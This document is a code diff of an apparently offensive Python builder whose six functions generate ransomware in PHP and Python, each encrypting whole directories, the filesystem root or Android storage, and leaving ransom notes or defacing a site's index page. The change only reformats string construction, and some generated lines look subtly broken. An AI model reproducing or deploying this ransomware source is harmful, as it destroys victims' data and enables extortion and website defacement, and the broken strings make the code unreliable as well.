@@ -108,46 +108,35 @@ red_t = '\033[0;31;40m'
 gray = '\033[1;37;40m'
 
 def ransomware1(name, tdir, sa):
-    func = """
-    {
-        $key = "\x00\x20\x02\x20\x00\x10\x22\x01\xe0"; // Replace with your own secret key
-        $encryptedContent = openssl_encrypt(file_get_contents($file), "AES-256-CBC", $key, 0, substr($key, 0, 16));
-        file_put_contents($file, $encryptedContent);
-    }
-
-    function encryptDirectory($dir) {
-        $dirContent = scandir($dir);
-
-        foreach ($dirContent as $entry) {
-            if ($entry !== "." && $entry !== "..") {
-                $entryPath = $dir . "/" . $entry;
-
-                if (is_dir($entryPath)) {
-                    encryptDirectory($entryPath);
-                } else {
-                    encryptFile($entryPath);
-                }
-            }
-        }
-    }
-    """
-    ransomware1 = f"""
-    <?php
-    function encryptFile($file) {func}
-
-    $message = "Encrypted By {name} !";
-    $targetDir = "{tdir}";
-
-    encryptDirectory($targetDir);
-
-    // Create a ransom note file
-    $ransomNote = $targetDir . "/RansomNote.txt";
-    file_put_contents($ransomNote, $message);
-
-    echo "All files in the directory " . $targetDir . " have been encrypted By {name}";
-
-    ?>
-    """
+    func = "{\n"
+    func += "    $key = 'FuckY0URM0MM4H4HaHaHA'; // Replace with your own secret key\n"
+    func += '    $encryptedContent = openssl_encrypt(file_get_contents($file), "AES-256-CBC", $key, 0, substr($key, 0, 16));\n'
+    func += "    file_put_contents($file, $encryptedContent);\n"
+    func += "}\n\n"
+    func += "function encryptDirectory($dir) {\n"
+    func += "    $dirContent = scandir($dir);\n\n"
+    func += "    foreach ($dirContent as $entry) {\n"
+    func += '        if ($entry !== "." && $entry !== "..") {\n'
+    func += '            $entryPath = $dir . "/" . $entry;\n\n'
+    func += "            if (is_dir($entryPath)) {\n"
+    func += "                encryptDirectory($entryPath);\n"
+    func += "            } else {\n"
+    func += "                encryptFile($entryPath);\n"
+    func += "            }\n"
+    func += "        }\n"
+    func += "    }\n"
+    func += "}"
+    ransomware1 = f"<?php\n"
+    ransomware1 += f"function encryptFile($file) {func}\n\n"
+    ransomware1 += f'$message = "Encrypted By {name} !";\n'
+    ransomware1 += f'$targetDir = "{tdir}";\n\n'
+    ransomware1 += f"encryptDirectory($targetDir);\n\n"
+    ransomware1 += f"// Create a ransom note file\n"
+    ransomware1 += f'$ransomNote = $targetDir . "/RansomNote.txt";\n'
+    ransomware1 += f"file_put_contents($ransomNote, $message);\n\n"
+    ransomware1 += f'echo "All files in the directory " . $targetDir . " have been encrypted By {name}";\n\n'
+    ransomware1 += f"?>"
+    
     target_directory = 'Ransomware'
     file_name = sa+'.php'
 
@@ -160,74 +149,57 @@ def ransomware1(name, tdir, sa):
     startloggingransomware1(path, ransomware1, sa)
     return ransomware1
 def ransomware2(name, sa):
-    func = """
-    {
-        $fileContent = file_get_contents($fileName);
-        $encryptedContent = openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3');
-        file_put_contents($fileName, $encryptedContent);
-    }
-
-    // Encrypt all files in a directory
-    function encryptDirectory($dir, $encryptionKey) {
-        $files = scandir($dir);
-        foreach($files as $file) {
-            $filePath = $dir . '/' . $file;
-            if(is_file($filePath)) {
-                encryptFile($filePath, $encryptionKey);
-            } elseif($file != '.' && $file != '..' && is_dir($filePath)) {
-                encryptDirectory($filePath, $encryptionKey);
-            }
-        }
-    }
-
-    // Function to create glitch effect on text
-    function glitchText($text) {
-        $glitchedText = '';
-        for ($i = 0; $i < strlen($text); $i++) {
-            $glitchedText .= '<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">' . $text[$i] . '</span>';
-        }
-        return $glitchedText;
-    }
-    """
+    func = "{\n"
+    func += "    $fileContent = file_get_contents($fileName);\n"
+    func += "    $encryptedContent = openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3');\n"
+    func += "    file_put_contents($fileName, $encryptedContent);\n"
+    func += "}\n\n"
+    func += "// Encrypt all files in a directory\n"
+    func += "function encryptDirectory($dir, $encryptionKey) {\n"
+    func += "    $files = scandir($dir);\n"
+    func += "    foreach($files as $file) {\n"
+    func += "        $filePath = $dir . '/' . $file;\n"
+    func += "        if(is_file($filePath)) {\n"
+    func += "            encryptFile($filePath, $encryptionKey);\n"
+    func += "        } elseif($file != '.' && $file != '..' && is_dir($filePath)) {\n"
+    func += "            encryptDirectory($filePath, $encryptionKey);\n"
+    func += "        }\n"
+    func += "    }\n"
+    func += "}\n\n"
+    func += "// Function to create glitch effect on text\n"
+    func += "function glitchText($text) {\n"
+    func += "    $glitchedText = '';\n"
+    func += "    for ($i = 0; $i < strlen($text); $i++) {\n"
+    func += '        $glitchedText .= "<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">" . $text[$i] . "</span>";\n'
+    func += "    }\n"
+    func += "    return $glitchedText;\n"
+    func += "}"
     glitvh = f"$glitchedText = glitchText('404 Encrypted By {name}');"
     shape1= '{'
     shape2= '}'
-    func2 = f"""
-    {shape1}
-        // Encrypt files in current directory
-        encryptDirectory('.', $encryptionKey);
-        
-        // Create glitched HTML message
-        {glitvh}
-        $htmlMessage = "<html><head><style>@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');</style></head><body style='background: linear-gradient(to right, blue, cyan);'><h1 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>$glitchedText</h1><h2 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>Wh00pz, It's encrypted! Enjoy the new site !</h2></body></html>";
-        
-        // Write HTML message to a file
-        file_put_contents('index.php', $htmlMessage);
-        
-        echo "Wh00pz!, Encrypted By {sa}, Enjoy your new SITE!'.";
-    {shape2}
-    """
-    mainransom = f"""
-    // Main ransomware function
-    function ransomware($encryptionKey) {func2}
-
-    // Call the ransomware function
-    ransomware($encryptionKey);
-
-    ?>
-    """
-    ransomware2 = f"""
-    <?php
-
-    // Ransomware PHP script to encrypt files with a cool HTML message including a glitch effect
-    // Disclaimer: This script is for educational purposes only and should not be used for malicious intent.
-
-    $encryptionKey = "zxcvbnm1234567890asdfghjklzxcvbnmqwertyuiop"; // Change this to your desired encryption key
-    {func}
-    // Function to encrypt a file
-    function encryptFile($fileName, $encryptionKey) {mainransom}
-    """
+    func2 = f"{shape1}\n"
+    func2 += f"    // Encrypt files in current directory\n"
+    func2 += f"    encryptDirectory('.', $encryptionKey);\n\n"
+    func2 += f"    // Create glitched HTML message\n"
+    func2 += f"    {glitvh}\n"
+    func2 += f"    $htmlMessage = '<html><head><style>@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');</style></head><body style='background: linear-gradient(to right, blue, cyan);'><h1 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>$glitchedText</h1><h2 style='font-family: Roboto, sans-serif; color: white; text-align: center;'>Wh00pz, It's encrypted! Enjoy the new site !</h2></body></html>';\n"
+    func2 += f"    // Write HTML message to a file\n"
+    func2 += f"    file_put_contents('index.php', $htmlMessage);\n\n"
+    func2 += f'    echo "Wh00pz!, Encrypted By {sa}, Enjoy your new SITE!.";\n'
+    func2 += f"{shape2}"
+    mainransom = f"// Main ransomware function\n"
+    mainransom += f"function ransomware($encryptionKey) {func2}\n\n"
+    mainransom += f"// Call the ransomware function\n"
+    mainransom += f"ransomware($encryptionKey);\n\n"
+    mainransom += f"?>"
     
+    ransomware2 = f"<?php\n\n"
+    ransomware2 += f"// Ransomware PHP script to encrypt files with a cool HTML message including a glitch effect\n"
+    ransomware2 += f"// Disclaimer: This script is for educational purposes only and should not be used for malicious intent.\n\n"
+    ransomware2 += f'$encryptionKey = "zxcvbnm1234567890asdfghjklzxcvbnmqwertyuiop"; // Change this to your desired encryption key\n'
+    ransomware2 += f"{func}\n"
+    ransomware2 += f"// Function to encrypt a file\n"
+    ransomware2 += f"function encryptFile($fileName, $encryptionKey) {mainransom}"
     target_directory = 'Ransomware'
     file_name = sa+'.php'
 
@@ -240,51 +212,38 @@ def ransomware2(name, sa):
     startloggingransomware2(path, ransomware2, sa)
     return ransomware2
 def ransomware3(name, sa):
-    ransomware3 = f"""
-    import os
-    import sys
-    import base64
-    from Crypto.Cipher import AES
-
-    def encrypt_file(filename, key):
-        chunk_size = 64 * 1024
-        output_filename = filename + ".lockedby{name}"
-
-        try:
-            with open(filename, 'rb') as file:
-                data = file.read()
-
-            cipher = AES.new(key, AES.MODE_ECB)
-            encrypted_data = cipher.encrypt(pad_data(data))
-
-            with open(output_filename, 'wb') as file:
-                file.write(base64.b64encode(encrypted_data))
-
-            os.remove(filename)
-            print("File locked: " + filename)
-            print("Encrypted file: " + output_filename)
-
-        except Exception as e:
-            print("Error: " + str(e))
-            pass
-
-    def pad_data(data):
-        padding_size = AES.block_size - (len(data) % AES.block_size)
-        return data + (chr(padding_size) * padding_size).encode()
-
-    if __name__ == "__main__":
-        key = b'SuperSecretKey123' # Change this with your desired encryption key
-
-        # Enter the directory path you want to encrypt
-        directory_path = '/'
-
-        for root, dirs, files in os.walk(directory_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                encrypt_file(file_path, key)
-
-    print("All files encrypted successfully!")
-    """
+    ransomware3 = f"import os\n"
+    ransomware3 += f"import sys\n"
+    ransomware3 += f"import base64\n"
+    ransomware3 += f"from Crypto.Cipher import AES\n\n"
+    ransomware3 += f"def encrypt_file(filename, key):\n"
+    ransomware3 += f"    chunk_size = 64 * 1024\n"
+    ransomware3 += f'    output_filename = filename + ".lockedby{name}"\n\n'
+    ransomware3 += f"    try:\n"
+    ransomware3 += f"        with open(filename, 'rb') as file:\n"
+    ransomware3 += f"            data = file.read()\n\n"
+    ransomware3 += f"        cipher = AES.new(key, AES.MODE_ECB)\n"
+    ransomware3 += f"        encrypted_data = cipher.encrypt(pad_data(data))\n\n"
+    ransomware3 += f"        with open(output_filename, 'wb') as file:\n"
+    ransomware3 += f"            file.write(base64.b64encode(encrypted_data))\n"
+    ransomware3 += f"        os.remove(filename)\n"
+    ransomware3 += f'        print("File locked: " + filename)\n'
+    ransomware3 += f'        print("Encrypted file: " + output_filename)\n\n'
+    ransomware3 += f"    except Exception as e:\n"
+    ransomware3 += f'        print("Error: " + str(e))\n'
+    ransomware3 += f"        pass\n\n"
+    ransomware3 += f"def pad_data(data):\n"
+    ransomware3 += f"    padding_size = AES.block_size - (len(data) % AES.block_size)\n"
+    ransomware3 += f"    return data + (chr(padding_size) * padding_size).encode()\n\n"
+    ransomware3 += f'if __name__ == "__main__":\n'
+    ransomware3 += f"   key = b'SuperSecretKey123' # Change this with your desired encryption key\n\n"
+    ransomware3 += f"    # Enter the directory path you want to encrypt\n"
+    ransomware3 += f"    directory_path = '/'\n\n"
+    ransomware3 += f"    for root, dirs, files in os.walk(directory_path):\n"
+    ransomware3 += f"        for file in files:\n"
+    ransomware3 += f"            file_path = os.path.join(root, file)\n"
+    ransomware3 += f"            encrypt_file(file_path, key)\n\n"
+    ransomware3 += f'print("All files encrypted successfully!")'
     target_directory = 'Ransomware'
     file_name = sa+'.py'
 
@@ -297,56 +256,46 @@ def ransomware3(name, sa):
     startloggingransomware3(path, ransomware3, sa)
     return ransomware3
 def ransomware4(sa):
-    ransomware4 = """
-    import os
-    from cryptography.fernet import Fernet
-
-    def encrypt_file(key, path):
-        try:
-            with open(path, 'rb+') as file:
-                file_data = file.read()
-                cipher = Fernet(key)
-                encrypted_data = cipher.encrypt(file_data)
-
-                file.seek(0)
-                file.write(encrypted_data)
-                file.truncate()
-            return True
-        except:
-            return False
-
-    def lock_android_files():
-        key = Fernet.generate_key()
-        files = []
-
-        # Specify the directory to target for encryption
-        target_directory = '/sdcard/'
-
-        # Walk through the directory and find all files
-        for root, _, filenames in os.walk(target_directory):
-            for filename in filenames:
-                file_path = os.path.join(root, filename)
-                files.append(file_path)
-
-        for file in files:
-            if encrypt_file(key, file):
-                print(f"Successfully encrypted: {file}")
-            else:
-                print(f"Failed to encrypt: {file}")
-
-        # Display a message on the device screen
-        message_file = '/sdcard/ransomware_message.txt'
-        message = "Locked By Ransomware"
-
-        if encrypt_file(key, message_file):
-            with open(message_file, 'w') as file:
-                file.write(message)
-            print("Message file encrypted successfully")
-        else:
-            print("Failed to encrypt message file")
-
-    lock_android_files()
-    """
+    ransomware4 = "import os\n"
+    ransomware4 += "from cryptography.fernet import Fernet\n\n"
+    ransomware4 += "def encrypt_file(key, path):\n"
+    ransomware4 += "    try:\n"
+    ransomware4 += "        with open(path, 'rb+') as file:\n"
+    ransomware4 += "            file_data = file.read()\n"
+    ransomware4 += "            cipher = Fernet(key)\n"
+    ransomware4 += "            encrypted_data = cipher.encrypt(file_data)\n\n"
+    ransomware4 += "            file.seek(0)\n"
+    ransomware4 += "            file.write(encrypted_data)\n"
+    ransomware4 += "            file.truncate()\n"
+    ransomware4 += "        return True\n"
+    ransomware4 += "    except:\n"
+    ransomware4 += "        return False\n\n"
+    ransomware4 += "def lock_android_files():\n"
+    ransomware4 += "    key = Fernet.generate_key()\n"
+    ransomware4 += "    files = []\n\n"
+    ransomware4 += "    # Specify the directory to target for encryption\n"
+    ransomware4 += "    target_directory = '/sdcard/\n\n'"
+    ransomware4 += "    # Walk through the directory and find all files\n"
+    ransomware4 += "    for root, _, filenames in os.walk(target_directory):\n"
+    ransomware4 += "        for filename in filenames:\n"
+    ransomware4 += "            file_path = os.path.join(root, filename)\n"
+    ransomware4 += "            files.append(file_path)\n\n"
+    ransomware4 += "    for file in files:\n"
+    ransomware4 += "        if encrypt_file(key, file):\n"
+    ransomware4 += '            print(f"Successfully encrypted: {file}")\n'
+    ransomware4 += "        else:\n"
+    ransomware4 += '            print(f"Failed to encrypt: {file}")\n\n'
+    ransomware4 += "    # Display a message on the device screen\n"
+    ransomware4 += "    message_file = '/sdcard/ransomware_message.txt'\n"
+    ransomware4 += '    message = "Locked By Ransomware"\n\n'
+    ransomware4 += "    if encrypt_file(key, message_file):\n"
+    ransomware4 += "        with open(message_file, 'w') as file:\n"
+    ransomware4 += "            file.write(message)\n"
+    ransomware4 += '        print("Message file encrypted successfully")\n'
+    ransomware4 += "    else:\n"
+    ransomware4 += '        print("Failed to encrypt message file")\n'
+    ransomware4 += "lock_android_files()"
+    
     target_directory = 'Ransomware'
     file_name = sa+'.py'
 
@@ -359,50 +308,40 @@ def ransomware4(sa):
     startloggingransomware4(path, ransomware4, sa)
     return ransomware4
 def ransomware5(name, sa):
-    ransomware5 = f"""
-    import os
-    import shutil
-    import getpass
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import pad
-    import base64
+    ransomware5 = f"import os\n"
+    ransomware5 += f"import shutil\n"
+    ransomware5 += f"import getpass\n"
+    ransomware5 += f"from Crypto.Cipher import AES\n"
+    ransomware5 += f"from Crypto.Util.Padding import pad\n"
+    ransomware5 += f"import base64\n\n"
+    ransomware5 += f"# Get the secret key for encryption\n"
+    ransomware5 += f"password = 'Y0URM0MM41SG01N9T0B33XPL0D3D!H4HaHaAHA'\n\n"
+    ransomware5 += f"def encrypt_file(file_path):\n"
+    ransomware5 += f"    try:\n"
+    ransomware5 += f"        # Open the input file\n"
+    ransomware5 += f"        with open(file_path, 'rb') as file:\n"
+    ransomware5 += f"            file_data = file.read()\n\n"
+    ransomware5 += f"        # Initialize the cipher with the secret key and AES mode\n"
+    ransomware5 += f"        cipher = AES.new(pad(password.encode(), AES.block_size), AES.MODE_ECB)\n\n"
+    ransomware5 += f"        # Encrypt the file data and base64 encode it\n"
+    ransomware5 += f"        encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))\n"
+    ransomware5 += f"        encrypted_data = base64.b64encode(encrypted_data)\n\n"
+    ransomware5 += f"        # Write the encrypted data back to the file\n"
+    ransomware5 += f"        with open(file_path, 'wb') as file:\n"
+    ransomware5 += f"            file.write(encrypted_data)\n\n"
+    ransomware5 += f"    except:\n"
+    ransomware5 += f"        pass\n\n"
+    ransomware5 += f"# Get all files in the system\n"
+    ransomware5 += f"file_list = []\n"
+    ransomware5 += f"for dirpath, dirnames, filenames in os.walk('/'):\n"
+    ransomware5 += f"    for file in filenames:\n"
+    ransomware5 += f"        file_list.append(os.path.join(dirpath, file))\n"
+    ransomware5 += f"# Encrypt each file in the system\n"
+    ransomware5 += f"for file in file_list:\n"
+    ransomware5 += f"    encrypt_file(file)\n\n"
+    ransomware5 += f"# Display the ransom message\n"
+    ransomware5 += f'print("Locked By {name} Ransomware")'
 
-    # Get the secret key for encryption
-    password = 'Y0URM0MM41SG01N9T0B33XPL0D3D!H4HaHaAHA'
-
-    def encrypt_file(file_path):
-        try:
-            # Open the input file
-            with open(file_path, 'rb') as file:
-                file_data = file.read()
-
-            # Initialize the cipher with the secret key and AES mode
-            cipher = AES.new(pad(password.encode(), AES.block_size), AES.MODE_ECB)
-
-            # Encrypt the file data and base64 encode it
-            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
-            encrypted_data = base64.b64encode(encrypted_data)
-
-            # Write the encrypted data back to the file
-            with open(file_path, 'wb') as file:
-                file.write(encrypted_data)
-
-        except:
-            pass
-
-    # Get all files in the system
-    file_list = []
-    for dirpath, dirnames, filenames in os.walk('/'):
-        for file in filenames:
-            file_list.append(os.path.join(dirpath, file))
-
-    # Encrypt each file in the system
-    for file in file_list:
-        encrypt_file(file)
-
-    # Display the ransom message
-    print("Locked By {name} Ransomware")
-    """
     target_directory = 'Ransomware'
     file_name = sa+'.py'
 
@@ -415,46 +354,39 @@ def ransomware5(name, sa):
     startloggingransomware5(path, ransomware5, sa)
     return ransomware5
 def ransomware6(name, sa):
-    ransomware6 = f"""
-    import os
-    import random
-    from cryptography.fernet import Fernet
+    ransomware6 = f"import os\n"
+    ransomware6 += f"import random\n"
+    ransomware6 += f"from cryptography.fernet import Fernet\n\n"
+    ransomware6 += f"def generate_key():\n"
+    ransomware6 += f"    key = Fernet.generate_key()\n"
+    ransomware6 += f"    with open('key.key', 'wb') as key_file:\n"
+    ransomware6 += f"        key_file.write(key)\n\n"
+    ransomware6 += f"def encrypt_file(file_path, key):\n"
+    ransomware6 += f"    with open(file_path, 'rb') as file:\n"
+    ransomware6 += f"        data = file.read()\n\n"
+    ransomware6 += f"    f = Fernet(key)\n"
+    ransomware6 += f"    encrypted_data = f.encrypt(data)\n\n"
+    ransomware6 += f"    with open(file_path, 'wb') as encrypted_file:\n"
+    ransomware6 += f"        encrypted_file.write(encrypted_data)\n\n"
+    ransomware6 += f"    os.remove(file_path)  # remove the original file\n\n"
+    ransomware6 += f""
+    ransomware6 += f"def lock_files(start_directory, key):\n"
+    ransomware6 += f"    for root, _, files in os.walk(start_directory):\n"
+    ransomware6 += f"        for file in files:\n"
+    ransomware6 += f"            file_path = os.path.join(root, file)\n"
+    ransomware6 += f"            encrypt_file(file_path, key)\n\n"
+    ransomware6 += f"    # Create a text file with the ransom message\n"
+    ransomware6 += f"    with open('message.txt', 'w') as message_file:\n"
+    ransomware6 += f"        message_file.write('Locked By {name} Ransomware')\n\n"
+    ransomware6 += f""
+    ransomware6 += f"    # Encrypt the ransom message file\n"
+    ransomware6 += f"    encrypt_file('message.txt', key)\n\n"
+    ransomware6 += f""
+    ransomware6 += f"generate_key()\n"
+    ransomware6 += f"key = open('key.key', 'rb').read()\n\n"
+    ransomware6 += f""
+    ransomware6 += f"lock_files('/', key)"
 
-    def generate_key():
-        key = Fernet.generate_key()
-        with open('key.key', 'wb') as key_file:
-            key_file.write(key)
-
-    def encrypt_file(file_path, key):
-        with open(file_path, 'rb') as file:
-            data = file.read()
-
-        f = Fernet(key)
-        encrypted_data = f.encrypt(data)
-
-        with open(file_path, 'wb') as encrypted_file:
-            encrypted_file.write(encrypted_data)
-
-        os.remove(file_path)  # remove the original file
-
-    def lock_files(start_directory, key):
-        for root, _, files in os.walk(start_directory):
-            for file in files:
-                file_path = os.path.join(root, file)
-                encrypt_file(file_path, key)
-
-        # Create a text file with the ransom message
-        with open('message.txt', 'w') as message_file:
-            message_file.write('Locked By {name} Ransomware')
-
-        # Encrypt the ransom message file
-        encrypt_file('message.txt', key)
-
-    generate_key()
-    key = open('key.key', 'rb').read()
-
-    lock_files('/', key)
-    """
     target_directory = 'Ransomware'
     file_name = sa+'.py'
 
